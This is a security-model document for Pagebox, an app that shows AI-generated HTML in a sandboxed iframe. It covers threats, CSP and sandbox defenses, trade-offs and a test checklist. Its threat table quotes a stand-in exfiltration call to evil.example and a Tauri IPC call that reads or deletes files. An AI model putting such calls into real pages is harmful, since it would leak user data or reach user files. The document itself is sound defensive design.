# Security model

AI-generated HTML is **untrusted input**. It may contain scripts, trackers, external
requests, or (rarely) something malicious. Pagebox must display it without
giving it access to the app or the user's computer.

## Threats

| Threat | Example |
| --- | --- |
| Page script calls the app's backend | `window.__TAURI__.invoke(...)` to read/delete files |
| Page reads other pages' data | Shared storage, or access to the parent window |
| Network exfiltration | `fetch("https://evil.example", { body: ... })`, tracking pixels |
| Navigating the app away | `top.location = ...` |
| Resource abuse | Infinite loops, huge allocations |
| Popups / downloads | `window.open`, auto-download |

## Defenses

1. **Sandboxed iframe, no same-origin.**
   `<iframe sandbox="allow-scripts" srcdoc="...">`
   Do **not** add `allow-same-origin` together with `allow-scripts`, because that combination
   lets the page remove its own sandbox. Without same-origin, the page gets an opaque
   origin and cannot reach the parent or Tauri's IPC.
2. **Never render untrusted HTML in the main app webview.** Only inside the iframe.
3. **Block the network by default.** Inject a Content-Security-Policy `<meta>` into the page
   before rendering (implemented in `src/lib/sandbox.ts`): `default-src 'none';
   script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:;
   font-src data:; media-src data: blob:; connect-src 'none'; form-action 'none';
   base-uri 'none'; frame-src 'none'`. A per-page **Allow internet** toggle (v0.4)
   relaxes this.
4. **Tauri capabilities kept minimal.** The main window only gets the permissions it needs
   (`core:default` in v0.1); the app's own CSP is set in `tauri.conf.json`.
   Note: `srcdoc` iframes **inherit the parent document's CSP**, so the app CSP must
   include `'unsafe-inline'` for `script-src`/`style-src` or previewed pages could not
   run their inline code. Isolation still comes from the sandbox (opaque origin), and
   the injected per-page meta CSP restricts the page far below the app CSP.
   **Important:** `dangerousDisableAssetCspModification: true` is set in `tauri.conf.json`.
   By default Tauri hashes the inline bootstrap script it injects into `index.html` at
   build time and appends `'sha256-…'` to `script-src` at runtime. Per the CSP spec, any
   hash/nonce source makes browsers **ignore `'unsafe-inline'`** — which silently killed
   every previewed page's inline scripts in release builds (blank canvases, dead sliders)
   while `tauri dev` worked, because the dev server never gets the asset CSP treatment.
   Disabling the asset CSP modification keeps the configured CSP verbatim, so
   `'unsafe-inline'` stays effective for both the bootstrap and the sandboxed previews.
5. **No popups / top navigation.** Omit `allow-popups`, `allow-top-navigation`, `allow-forms`
   unless a toggle explicitly enables them.
6. **Treat paths as untrusted.** File paths are generated by the backend (IDs), never taken
   from page content or user-typed strings.

## Known trade-offs

- Without same-origin, pages cannot use `localStorage` or cookies. Some AI-made apps
  (todo lists, games with saved scores) won't persist data. Possible future fix: a
  controlled `postMessage` bridge that provides per-page storage.
- Allowing internet re-opens exfiltration risk, so it is opt-in and clearly labeled.

## Security test pages

Keep these in `tests/security-pages/` and verify each is contained:

- [ ] Tries to call `window.parent` / `window.top` APIs
- [ ] Tries to call `window.__TAURI__` / `window.__TAURI_INTERNALS__`
- [ ] Tries `fetch()` to an external URL with internet **off**
- [ ] Tries to load an external script/image/font with internet **off**
- [ ] Tries `window.open(...)` and `top.location = ...`
- [ ] Contains an infinite loop (app stays responsive; user can close the page)
- [ ] Tries to read `localStorage` / `document.cookie`

## Reporting

This is a learning project. If you find a vulnerability, please open an issue.
